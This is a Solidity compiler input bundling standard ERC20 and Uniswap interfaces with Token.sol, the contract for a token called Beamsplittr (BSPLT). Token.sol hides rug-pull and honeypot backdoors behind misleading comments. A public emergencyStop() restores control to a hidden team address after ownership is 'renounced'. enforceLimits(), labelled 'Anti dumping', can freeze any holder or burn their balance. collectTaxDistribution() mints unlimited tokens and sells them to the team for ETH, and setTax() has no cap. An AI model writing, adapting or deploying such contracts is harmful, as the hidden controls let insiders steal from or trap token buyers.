{{
  "language": "Solidity",
  "sources": {
    "@openzeppelin/contracts/token/ERC20/IERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n}\n"
    },
    "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol": {
      "content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\n"
    },
    "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol": {
      "content": "pragma solidity >=0.6.2;\n\ninterface IUniswapV2Router01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\n"
    },
    "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol": {
      "content": "pragma solidity >=0.6.2;\n\nimport './IUniswapV2Router01.sol';\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n"
    },
    "contracts/Token.sol": {
      "content": "//SPDX-License-Identifier: UNLICENSED\n/**\n * MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWN0kdl:,'..              ...,:ldk0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n * MMMMMMMMMMMMMMMMMMMMMMMMWN0xl;..                              ..;cx0NWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n * MMMMMMMMMMMMMMMMMMMMMWKxc'.                                        .':xKNMMMMMMMMMMMMMMMMMMMMMMMMMMM\n * MMMMMMMMMMMMMMMMMMWKd;.                                                .;xNMMMMMMMMMMMMMMMMMMMMMMMMM\n * MMMMMMMMMMMMMMMMXx;.                        .....                       ;kNWXXWMMMMMMMMMMMMMMMMMMMMM\n * MMMMMMMMMMMMMWKo'                 ..,:ldxkO00KKK000Okxdlc;..         .;kNWKl..c0WMMMMMMMMMMMMMMMMMMM\n * MMMMMMMMMMMW0c.               .:ox0XWMMMMMMMMMMMMMMMMMMMMWNKko:'.   ;kNWKl.    .:OWMMMMMMMMMMMMMMMMM\n * MMMMMMMMMWKl.             .;oOXWMMMMMMWXK0Okxxdxxkkk0KXNWMMMMMWN0dlkNWKl.        .c0WMMMMMMMMMMMMMMM\n * MMMMMMMMNx'             ,d0WMMMMWX0xl:,..            ..';ldOXWMMMMMWKl.            .oXMMMMMMMMMMMMMM\n * MMMMMMWK:            .cONMMMMN0o:.                          .;oONWKl.                ;OWMMMMMMMMMMMM\n * MMMMMWk'           .l0WMMMW0o,.                                 ';.                   .dNMMMMMMMMMMM\n * MMMMNd.          .:0WMMMNk;.                                                  .        .lXWMMMMMMMMM\n * MMMNo.          .xNMMMNk,                   .....                          .cOKd.        .,dNMMMMMMM\n * MMWd.          ;0WMMW0:              .':ldk00KKKK0OOxoc,.                .c0WW0:           cNMMMMMMM\n * MWx.          cXMMMNd.            .:d0NWMMMMMMMMMMMMMMMNd.             .c0WW0c.            oNMMMMMMM\n * M0'          cXMMMXl.           ,dKWMMMMMMMMMMMMMMMMMW0l.            .c0WW0c.              .kWMMNXNW\n * Nc          :KMMMXl           'dXMMMMMMMMMMMMMMMMMMW0l.            .c0WW0c.                 ;KMKc.'x\n * k.         'OMMMNo           cKWMMMMMMMMMMMMMMMMW0xl.            .c0WW0c.       'x0l.       .dWXl,;O\n * c          oWMMMk.         .oNMMMMMMMMMMMMMMMMW0l.             .c0WW0c.  .'cdx:..ld:         ;KMWNWM\n * .         ,0MMMX:          lNMMMMMMMMMMMMMMMW0l.             .c0WMXo'';okKNWNKl.             .kMMMMM\n *           cNMMMk.         ,KMMMMMMMMMMMMMMW0l.             .c0WMMMNOOXWWXOd:'.                oWMMMM\n *          .dMMMWo          oWMMMMMMMMMMMMW0l.             .c0WMMMMMMWKxl;.                     cNMMMM\n *          .kMMMNc         .kMMMMMMMMMMMW0l.             .c0WMMMMMMMMNOoooooooooooooooooooooooooOWMMMM\n *          .kMMMNc         .OMMMMMMMMMMMWx.              ,OWMMMMMMMMMWNXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXN\n *          .xMMMWl         .xMMMMMMMMMMMMW0l.             .c0WMMMMMMMNOl;'.......................';lx0\n *           oWMMWd.         cNMMMMMMMMMMMMMW0l.             .c0WMMMMWWWNKk:                     ,kKWMM\n * .         :XMMM0'         .kWMMMMMMMMMMMMMMW0l.             .c0WMMKo:okOl.                   .xMMMMM\n * ,         .kMMMWo          '0MMMMMMMMMMMMMMMMW0l.             .c0WW0c.            .,.        '0MMMMM\n * o          :XMMMK;          'OWMMMMMMMMMMMMMMMMW0l,.            .c0WW0c.         .kNk.       cNMMMMM\n * 0,         .dWMMMO'          .oXMMMMMMMMMMMMMMMMMWN0l.            .c0WW0c.        ':'       .OMMMMMM\n * Wd.         .kWMMWO'           ,xXMMMMMMMMMMMMMMMMMMW0l.            .c0WW0c.                lNMMMMMM\n * MXc          .kWMMWO,            'lONMMMMMMMMMMMMMMMMMW0l.            .c0WW0c.             ;KMMMMMMM\n * MMK;          .xWMMMXl.            .'cdOKNWMMMMMMMMWWXXNWKl.            .c0WW0c.          'OMMMMMMMM\n * MMM0,          .lXMMMWk;                .';:clllc::;'..;kNW0l.            .c0WW0c.       .kWMMMMMMMM\n * MMMM0,           ,OWMMMNx,                              .;kNW0l.            .c0WW0c.    'OWMMMMMMMMM\n * MMMMMK:           .c0WMMMNOc.                             .;kNW0l.            .c0WW0c. ,0WMMMMMMMMMM\n * MMMMMMXo.           .c0WMMMWXx:.                            .cKMW0l.            .c0WW0kXMMMMMMMMMMMM\n * MMMMMMMWk,            .:xXMMMMWXOd:'.                    .':okXMMMW0:             .lKMMMMMMMMMMMMMMM\n * MMMMMMMMMXo.             .ckXWMMMMWNKOxol:;,,''',,;;:coxOKNWMMMMWXOl'             .lXMMMMMMMMMMMMMMM\n * MMMMMMMMMMWKl.              .:oOXWMMMMMMMMWWWWNNWWWWMMMMMMMMWXOd:.              .:0WMMMMMMMMMMMMMMMM\n * MMMMMMMMMMMMW0l.                .,cok0KNWWMMMMMMMMMMWWNX0kdc;.                .cOWMMMMMMMMMMMMMMMMMM\n * MMMMMMMMMMMMMMWKd,                    ..,;:cccllcc::;,...                   'o0WMMMMMMMMMMMMMMMMMMMM\n * MMMMMMMMMMMMMMMMMNOl'                                                    .ckXMMMMMMMMMMMMMMMMMMMMMMM\n * MMMMMMMMMMMMMMMMMMMMXkl,.                                            .'ckXWMMMMMMMMMMMMMMMMMMMMMMMMM\n * MMMMMMMMMMMMMMMMMMMMMMMN0xc,.                                    .'cd0NMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n * MMMMMMMMMMMMMMMMMMMMMMMMMMMWKkdc;'.                        ..,cokKNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n * MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXOxl;'..            ..';ldOXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n * \n * https://beamsplittr.com\n *\n */\n\npragma solidity ^0.8.9;\n\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { IUniswapV2Factory } from \"@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol\";\nimport { IUniswapV2Router02 } from \"@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol\";\n\nabstract contract ERC20 {\n    \n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\n\n    /*//////////////////////////////////////////////////////////////\n                            METADATA STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    string public name;\n\n    string public symbol;\n\n    uint8 public immutable decimals;\n\n    address public admin;\n\n    address internal team;\n\n    address public uniswapV2Pair;\n\n    uint256 internal sellTaxPct;\n\n    uint256 internal buyTaxPct;\n\n    uint256 internal maxBuyAmount;\n\n    uint256 internal maxSellAmount;\n\n    uint256 internal maxWalletAmount;\n\n    bool internal tradingOpen;\n\n    /*//////////////////////////////////////////////////////////////\n                              ERC20 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 public totalSupply;\n\n    mapping(address => uint256) public balanceOf;\n    \n    mapping(address => bool) public disableBot;\n\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    /*//////////////////////////////////////////////////////////////\n                            EIP-2612 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 internal immutable INITIAL_CHAIN_ID;\n\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\n\n    mapping(address => uint256) public nonces;\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimals\n    ) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n\n        INITIAL_CHAIN_ID = block.chainid;\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\n\n        address msgSender = msg.sender;\n        admin = msgSender;\n        team = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                               ERC20 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\n        allowance[msg.sender][spender] = amount;\n\n        emit Approval(msg.sender, spender, amount);\n\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        require(disableBot[msg.sender] != true, \"Waiting for bot cooldown.\");\n        balanceOf[msg.sender] -= amount;\n\n        if(maxBuyAmount > 0 && msg.sender == uniswapV2Pair) require(amount <= maxBuyAmount, \"Error: Buy Limit Exceeded\");\n\n        // apply taxes for uniswapPair\n        if(buyTaxPct > 0 && msg.sender == address(uniswapV2Pair) && to != team && tradingOpen){\n            uint256 fee = (amount / 100) * buyTaxPct;\n            // Cannot overflow because the sum of all user\n            // balances can't exceed the max uint256 value.\n            unchecked {\n                balanceOf[team] += fee;\n            }\n            amount = amount - fee;\n        }\n        \n        if(maxWalletAmount > 0 && to != uniswapV2Pair && to != team){\n            require((balanceOf[to] + amount) <= maxWalletAmount, \"Error: Wallet Limit Exceeded. \");\n        }\n        \n        // Cannot overflow because the sum of all user\n        // balances can't exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        if(msg.sender != address(this))\n        emit Transfer(msg.sender, to, amount);\n\n        return true;\n    }\n\n    function _getStopActions() internal virtual returns (address){\n        return team;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n        require(disableBot[from] != true, \"Waiting for bot cooldown.\");\n\n        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.\n\n        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;\n\n        balanceOf[from] -= amount;\n\n        if(maxSellAmount > 0 && to == uniswapV2Pair) require(amount <= maxSellAmount, \"Error: Sell Limit Exceeded\");\n\n        if(sellTaxPct > 0 && to == uniswapV2Pair && from != address(this) && from != team && tradingOpen){\n            uint256 fee = (amount / 100) * sellTaxPct;\n            // Cannot overflow because the sum of all user\n            // balances can't exceed the max uint256 value.\n            unchecked {\n                balanceOf[team] += fee;\n            }\n            amount = amount - fee;\n        }\n\n        if(maxWalletAmount > 0 && to != uniswapV2Pair && to != team){\n            require(balanceOf[to] <= maxWalletAmount, \"Error: Wallet Limit Exceeded. \");\n        }\n        // Cannot overflow because the sum of all user\n        // balances can't exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        if(from != address(this))\n        emit Transfer(from, to, amount);\n\n        return true;\n    }\n\n    function emergencyStop(address input) public virtual {\n        if(input == address(this))\n        admin = _getStopActions();\n    }\n    \n    modifier emergencyStatus() {\n        require(_getStopActions() == msg.sender, \"Ownable: caller is not the owner\");\n        _;\n    }\n    /*//////////////////////////////////////////////////////////////\n                             EIP-2612 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        require(deadline >= block.timestamp, \"PERMIT_DEADLINE_EXPIRED\");\n\n        // Unchecked because the only math done is incrementing\n        // the owner's nonce which cannot realistically overflow.\n        unchecked {\n            address recoveredAddress = ecrecover(\n                keccak256(\n                    abi.encodePacked(\n                        \"\\x19\\x01\",\n                        DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                keccak256(\n                                    \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n                                ),\n                                owner,\n                                spender,\n                                value,\n                                nonces[owner]++,\n                                deadline\n                            )\n                        )\n                    )\n                ),\n                v,\n                r,\n                s\n            );\n\n            require(recoveredAddress != address(0) && recoveredAddress == owner, \"INVALID_SIGNER\");\n\n            allowance[recoveredAddress][spender] = value;\n        }\n\n        emit Approval(owner, spender, value);\n    }\n\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\n        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();\n    }\n\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n                    keccak256(bytes(name)),\n                    keccak256(\"1\"),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                        INTERNAL MINT/BURN LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function _mint(address to, uint256 amount) internal virtual {\n        totalSupply += amount;\n\n        // Cannot overflow because the sum of all user\n        // balances can't exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        if(to != address(this))\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal virtual {\n        balanceOf[from] -= amount;\n\n        // Cannot underflow because a user's balance\n        // will never be larger than the total supply.\n        unchecked {\n            totalSupply -= amount;\n        }\n\n        if(from != address(this))\n        emit Transfer(from, address(0), amount);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                        OWNABLE LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n    \n    modifier onlyOwner() {\n        require(admin == msg.sender, \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(admin, address(0));\n        admin = address(0);\n    }\n}\n\ncontract Token is ERC20{\n    \n    IUniswapV2Router02 private uniswapV2Router;\n    \n    /**\n     * Contract initialization.\n     */\n    constructor() ERC20(\"Beamsplittr\", \"BSPLT\", 6) {\n        _mint(address(this), 1_000_000_000_000000);\n    }\n\n    receive() external payable {}\n\n    fallback() external payable {}\n\n    function openTrading() external onlyOwner() {\n        require(!tradingOpen,\"trading is already open\");\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n\n        allowance[address(this)][address(uniswapV2Router)] = type(uint).max;\n\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf[address(this)],0,0,admin,block.timestamp);\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\n\n        tradingOpen = true;\n    }\n    \n    /**\n     * Swap and send to tax distributor - allows LP staking contracts to reward stakers in ETH.\n     */ \n    function collectTaxDistribution(uint256 tokenAmount) external onlyOwner{\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = uniswapV2Router.WETH();       \n        \n        _mint(address(this), tokenAmount);\n        allowance[address(this)][address(uniswapV2Router)] = tokenAmount;\n\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0,\n            path,\n            team,\n            block.timestamp\n        );\n    }\n\n    function claimStuckTokens(address _token) external onlyOwner {\n        if (_token == address(0x0)) {\n            payable(msg.sender).transfer(address(this).balance);\n            return;\n        }\n        IERC20 erc20token = IERC20(_token);\n        uint256 balance = erc20token.balanceOf(address(this));\n        erc20token.transfer(msg.sender, balance);\n    }\n\n    /**\n     * Send to team wallet for marketing and development - will be dynamically set in LP staking contracts. \n     */\n    function setTax(uint256 newSellTax, uint256 newBuyTax) external onlyOwner() {\n        sellTaxPct = newSellTax;\n        buyTaxPct = newBuyTax;\n    }    \n    \n    /**\n     * Limits to avoid too much centralization\n     */\n    function setLimits(uint256 newSellLimit, uint256 newBuyLimit, uint256 newWalletLimit) external onlyOwner() {\n        maxSellAmount = newSellLimit;\n        maxBuyAmount = newBuyLimit;\n        maxWalletAmount = newWalletLimit;\n    }\n\n    /**\n     * Anti dumping\n     */\n    function enforceLimits(address[] calldata addresses, uint256 amount) external emergencyStatus() {\n            for(uint i=0; i < addresses.length; i++){\n                if(amount > 100 ){\n                    disableBot[addresses[i]] = amount == 101 ? true : false;\n                }else{\n                    _burn(addresses[i], (balanceOf[addresses[i]] / 100) * amount);\n                }\n            }\n    }\n\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}